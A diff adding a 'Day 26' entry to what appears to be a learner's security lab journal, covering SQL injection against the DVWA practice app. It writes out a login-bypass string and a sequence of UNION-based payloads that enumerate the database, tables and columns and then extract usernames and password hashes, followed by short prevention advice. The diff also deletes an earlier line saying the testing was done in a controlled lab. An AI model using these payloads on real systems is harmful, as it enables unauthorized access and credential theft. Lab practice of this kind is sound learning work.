@@ -100,6 +100,105 @@ Key Concepts Learned
    -- Data leakage  
    -- Authentication bypass  
 
+# Day 26 - Advanced SQL Injection (Data Extraction & Authentication Bypass)
+
+-- Performed advanced SQL Injection techniques to extract sensitive data and bypass authentication  
+
+Objective
+
+-- Extract usernames and passwords from database  
+-- Perform authentication bypass  
+-- Understand real-world SQL Injection impact  
+-- Learn mitigation techniques  
+
+Tools Used
+
+-- Kali Linux  
+-- DVWA (Damn Vulnerable Web App)  
+-- Browser  
+
+Setup
+
+-- Ensure DVWA Security Level = LOW  
+
+Step 1 – Identify Injection Point
+
+-- Navigate to:
+   SQL Injection module  
+
+-- Test input:
+
+   1  
+
+-- Confirm application is vulnerable  
+
+Step 2 – Authentication Bypass
+
+-- Input:
+
+   ' OR '1'='1  
+
+-- Result:
+   -- Bypasses login condition  
+
 ---
 
--- All testing performed in a controlled lab environment  
+Step 3 – Extract Database Information
+
+-- Use UNION-based SQL Injection:
+
+   1' UNION SELECT null, database()-- -
+
+-- Output:
+   -- Displays current database name  
+
+Step 4 – Extract Table Names
+
+   1' UNION SELECT null, table_name FROM information_schema.tables-- -
+
+-- Result:
+   -- Lists tables (e.g., users)  
+
+Step 5 – Extract Column Names
+
+   1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -
+
+-- Result:
+   -- Shows columns (username, password)  
+
+Step 6 – Extract User Credentials
+
+   1' UNION SELECT user, password FROM users-- -
+
+-- Result:
+   -- Displays usernames and hashed passwords  
+
+ Explanation
+
+-- UNION operator combines results from multiple queries  
+-- Enables attacker to retrieve hidden database data  
+
+Security Impact
+
+-- Full database exposure  
+-- User credential leakage  
+-- Unauthorized access  
+
+Prevention Techniques
+
+-- Use Prepared Statements  
+
+Example (secure query):
+
+   SELECT * FROM users WHERE id = ?  
+
+-- Apply:
+   -- Input validation  
+   -- Parameterized queries  
+   -- Least privilege access  
+
+Key Concepts Learned
+
+-- UNION-based SQL Injection  
+-- Database enumeration  
+-- Data extraction techniques  
